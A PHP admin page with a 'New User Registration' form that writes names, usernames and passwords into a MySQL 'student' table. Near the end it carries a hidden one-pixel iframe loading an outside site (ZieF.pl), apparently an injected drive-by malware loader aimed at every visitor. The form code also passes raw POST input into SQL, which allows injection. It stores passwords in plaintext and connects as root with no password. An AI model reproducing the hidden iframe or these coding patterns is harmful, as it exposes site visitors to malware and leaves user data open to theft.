<?php
ob_start();
include('header.php');
include ('session.php');
$user_query = mysql_query("select * from teacher where teacher_id='$session_id'") or die(mysql_error());
$user_row = mysql_fetch_array($user_query);
?>
<body>

    <?php include('navhead_user.php'); ?>

    <div class="container">
        <div class="row-fluid">
            <div class="span3">

                <div class="hero-unit-3">
                    <div class="alert-index alert-success">
                        <i class="icon-calendar icon-large"></i>
                        <?php
                        $Today = date('y:m:d');
                        $new = date('l, F d, Y', strtotime($Today));
                        echo $new;
                        ?>
                    </div>
                </div>
                <div class="hero-unit-1">
              
                    <ul class="nav  nav-pills nav-stacked">
                        <li class="nav-header">NAVIGATE</li>
                        <li   class="active">
                            <a href="admin_home.php"><i class="icon-home icon-large"></i>&nbsp;Home
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>
                                </div>  
                            </a>

                        </li>
                        <li>
                                <div class="pull-right">
                                    </i>
                                </div>  
                            </a></li>  
                            </a></li> 
                            </a></li>


                    </ul>
                </div>

            </div>
            <div class="span9">





                <a href="admin_home.php" class="btn btn-success"><i class="icon-arrow-left icon-large"></i>&nbsp;Back</a>
                <br>
                <br>

                <div class="alert alert-info">
                    <button type="button" class="close" data-dismiss="alert">&times;</button>
                    <strong><i class="icon-user icon-large"></i>&nbsp;New User Registration</strong>
                </div>
                <div class="hero-unit-2">
                    <form class="form-horizontal" method="POST">
                        <div class="control-group">
                            <div class="controls">

                                <input type="text" name="firstname" placeholder="First Name" class="span5" required />               
                  </div>
<br/>

                            <div class="controls">

                                <input type="text" name="lastname" placeholder="Last Name" class="span5" required />

                           
                                
                  </div>
<br/>

                            <div class="controls">

                                <input type="text" name="email" placeholder="email" class="span5" required />

                           
                                
                  </div>

<br/>

                            <div class="controls">

                                <input type="text" name="username" placeholder="User Name" class="span5" required />

                           
                                
                  </div>
<br/>

 <div class="controls">

                                <input type="password" name="password" placeholder="password" class="span5" required />

                           
                                
                  </div>


  
                            


</br>


                        <div class="control-group">
                            <div class="controls">
                                <button type="submit" name="save_class" class="btn btn-success">Register User<i class="icon-plus-sign icon-large"></i>&nbsp;</button>
                            </div>
                            <?php
                            if (isset($_POST['save_class'])) {
                              
$firstname = $_POST['firstname'];
 
$lastname = $_POST['lastname'];
$username = $_POST['username'];
$password = $_POST['password'];
                             

        $host = 'localhost';
        $db = 'tourism';
        $user = 'root';
        $pass = '';

        // Connect to the database
        $con = mysql_connect($host, $user, $pass);
        mysql_select_db($db,$con);
        mysql_query("insert into student (firstname,lastname,username,password) values('$firstname','$lastname','$username','$password')",$con) or die(mysql_error());
header('location:newuser.php');
                            }
                            ?>
                        </div>
                    </form>
                </div>




                <!-- end slider -->
            </div>

        </div>
        <?php include('footer.php'); ?>
    </div>
</div>
</div>






<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>




